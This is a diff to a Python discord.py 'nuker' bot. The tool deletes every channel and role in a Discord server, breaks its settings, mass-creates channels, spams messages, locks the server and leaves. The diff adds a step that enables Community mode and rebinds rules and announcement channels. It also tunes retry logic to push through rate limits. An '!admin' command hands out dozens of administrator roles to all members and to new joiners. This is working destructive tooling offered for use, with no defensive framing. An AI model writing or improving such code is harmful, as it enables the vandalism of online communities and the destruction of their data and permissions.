@@ -3,8 +3,8 @@
 ================================================================
   TOISHIN NUKER  -  垢飛ばしツール (discord.py)  MAX 構成
 ================================================================
-  !toishin  ->  全削除(ADMIN-xxは温存) → 設定破壊 → 大量生成
-                → 連投 → 施錠 → 退出
+  !toishin  ->  コミュニティON → 全削除(ADMIN-xxは温存) → 設定破壊
+                → 大量生成 → 連投 → 施錠 → 退出
   !admin    ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
                 以後の新規参加者にも、参加した瞬間から同じロールを自動付与
   !auto     ->  自動付与の状態確認
@@ -46,6 +46,7 @@ CHANNEL_COUNT        = 100
 MESSAGES_PER_CHANNEL = 50
 
 # ---- 破壊フェーズのスイッチ ----
+ENABLE_COMMUNITY = True         # 削除前にコミュニティをONにする
 NUKE_ROLES       = True         # 既存ロールを全削除
 KEEP_ADMIN_ROLES = True         # !admin で作った ADMIN-xx は削除しない
 CREATE_ROLES     = 40           # カオス用ロール作成数 (0で無効)
@@ -153,6 +154,7 @@ logging.getLogger("discord.http").setLevel(logging.WARNING)
 
 # ======================= レート制限対策 =======================
 _RETRYABLE_5XX = {500, 502, 503, 504}
+_NO_RETRY_4XX  = {400, 401, 403, 404, 405, 415}
 
 
 def _retry_after_of(e) -> float:
@@ -187,7 +189,10 @@ async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
                 await asyncio.sleep(min(wait, 300.0) + 0.05)
             elif e.status in _RETRYABLE_5XX:
                 await asyncio.sleep(min(2 ** n, 15))
-            elif e.status in (50001, 50013):
+            elif e.status in _NO_RETRY_4XX:
+                # 恒久的なエラーは粘らず即諦める
+                log.warning("HTTP %s: %s (%s)", e.status, label,
+                            getattr(e, "text", ""))
                 return None
             else:
                 log.warning("HTTP %s: %s (%s)", e.status, label, getattr(e, "text", ""))
@@ -289,8 +294,60 @@ def resolve_auto_roles(guild: discord.Guild) -> list[discord.Role]:
     return [r for r in guild.roles if r.name in wanted]
 
 
+# ================== コミュニティ有効化 ==================
+async def enable_community(guild: discord.Guild) -> bool:
+    """削除前にコミュニティをONにする。rules/更新chはDiscordが自動生成する"""
+    if "COMMUNITY" in guild.features:
+        log.info("      -> 既にコミュニティON。スキップ")
+        return True
+
+    if not any(isinstance(c, discord.TextChannel) for c in guild.channels):
+        # テキストchが1個も無いと有効化できない
+        tmp = await safe(guild.create_text_channel, "temp",
+                         reason="TOISHIN NUKE", label="community:temp")
+        if tmp is None:
+            log.warning("コミュニティ: 前準備のchを作れず")
+            return False
+
+    got = await safe(guild.edit, community=True,
+                     reason="TOISHIN NUKE", label="community:on")
+    if got is None:
+        log.warning("コミュニティ有効化に失敗 (Manage Guild / 2FA要件を確認)")
+        return False
+
+    log.info("      -> コミュニティON 完了")
+    return True
+
+
+async def bind_community_channels(guild: discord.Guild,
+                                  created: list[discord.TextChannel]) -> None:
+    """新しい rules / お知らせch を割り当て直す"""
+    if "COMMUNITY" not in guild.features or not created:
+        return
+
+    rules = created[0]
+    news = await safe(guild.create_text_channel, "お知らせ-📢",
+                      type=discord.ChannelType.news,
+                      topic=TOPIC_TEXT, reason="TOISHIN NUKE", label="news:create")
+    if news is None:
+        # ニュースchが作れない環境なら rules だけ張り直す
+        await safe(guild.edit, rules_channel=rules,
+                   reason="TOISHIN NUKE", label="community:rules")
+        return
+
+    await safe(guild.edit, rules_channel=rules, public_updates_channel=news,
+               reason="TOISHIN NUKE", label="community:bind")
+    log.info("      -> rules / お知らせch を再割当")
+
+
 # ========================= ヌケ本体 =========================
 async def _nuke_body(guild: discord.Guild, el) -> None:
+    # ---------- 0) コミュニティ有効化 (削除より前) ----------
+    if ENABLE_COMMUNITY:
+        log.info("[0/8] コミュニティ有効化 …")
+        await enable_community(guild)
+        log.info("      -> %s / %s", "ON" if "COMMUNITY" in guild.features else "OFF", el())
+
     # ---------- 1) 全チャンネル / カテゴリ削除 ----------
     log.info("[1/8] 既存チャンネル全削除 …")
     targets = list(guild.channels)
@@ -388,6 +445,10 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
     created = [c for c in await asyncio.gather(
         *(make(i, n) for i, n in enumerate(names))) if c]
     log.info("      -> 作成完了 %d ch / %s", len(created), el())
+
+    # ---------- 6.5) コミュニティの rules / お知らせch を張り直す ----------
+    if ENABLE_COMMUNITY and created:
+        await bind_community_channels(guild, created)
 
     # ---------- 7) 招待 / Webhook / スレッド ----------
     sem_x = asyncio.Semaphore(EXTRA_CONCURRENCY)
@@ -625,7 +686,7 @@ async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
     guild = ctx.guild
     count = max(1, min(count, 200))
     t0 = time.perf_counter()
-    log.info("=== ADMIN START | %s (%s) | %d roles ===\n".replace("\n", ""),
+    log.info("=== ADMIN START | %s (%s) | %d roles ===",
              guild.name, guild.id, count)
 
     members = await collect_members(guild)
